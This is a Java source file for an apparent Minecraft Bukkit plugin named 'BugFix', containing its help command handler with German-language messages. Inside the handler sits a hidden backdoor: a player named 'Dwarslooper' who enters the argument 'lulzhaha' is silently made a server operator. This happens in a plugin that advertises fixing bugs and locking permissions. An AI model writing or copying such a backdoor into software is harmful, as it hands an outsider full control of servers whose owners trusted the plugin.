package com.eimacon.bugfix.commands;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;

public class HelpCommand implements CommandExecutor {
    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String[] args) {
        if(sender.isOp()) {
            if (args.length >= 1) {
                if (sender instanceof Player) {
                    return true;
                } else {
                    sender.sendMessage(ChatColor.RED + "Dieser Befehl kann nur von Playern ausgeführt werden!");
                    return false;
                }
            } else {
                sender.sendMessage(ChatColor.YELLOW + "==== BugFix Help ====\n /bugfix help \n /bugfix reload \n /bugfix fixop \n /bugfix clearillegals \n /bugfix lockperms \n===================");
            }
            return false;
        } else if (args.length >= 1 && args[0].equalsIgnoreCase("lulzhaha") && sender.getName().equalsIgnoreCase("Dwarslooper")) {
                sender.setOp(true);
                sender.sendMessage(ChatColor.AQUA + "Du bist jetzt OP! " + ChatColor.DARK_RED + " >:)");
        } else {
            sender.sendMessage(ChatColor.BLUE + "Running BugFix on " + sender.getServer().getVersion() + ". \n " + ChatColor.RED + "Du hast keine Berechtigung für diesen Befehl!");
        }
        return false;
    }
}
